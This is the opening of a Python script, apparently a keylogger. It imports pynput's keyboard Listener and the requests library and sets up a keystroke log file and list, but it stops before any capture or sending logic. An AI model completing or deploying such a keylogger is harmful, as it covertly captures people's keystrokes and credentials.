#!/usr/bin/python3

import requests
import os
import zc.lockfile
from pynput.keyboard import Listener

lock = zc.lockfile.Lockfile('anything.py')
path = 'keyboard_Input.txt'
keyboard_Input = []
count = 0
